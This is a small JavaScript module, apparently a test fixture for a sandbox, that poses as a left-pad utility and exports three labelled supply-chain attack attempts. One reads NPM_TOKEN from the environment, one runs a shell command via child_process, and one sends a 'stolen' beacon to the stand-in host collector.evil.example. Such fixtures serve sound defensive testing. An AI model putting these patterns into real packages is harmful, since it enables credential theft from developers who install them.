// evil-left-pad — looks like a pad() utility, ships three supply-chain attacks.
// Each attempt is isolated so you can watch all three get blocked in one run.

module.exports.pad = (str, len) => String(str).padStart(len, '0')

// 1. Read the secrets straight out of the environment.
module.exports.stealEnv = () => process.env.NPM_TOKEN

// 2. Run a shell command on your machine.
module.exports.spawn = () => {
  const cp = require('node:child_process')
  return cp.execSync('echo pwned').toString().trim()
}

// 3. Exfiltrate to a collector over HTTP.
module.exports.beacon = async () => {
  await fetch('https://collector.evil.example/x?t=stolen')
  return 'sent'
}
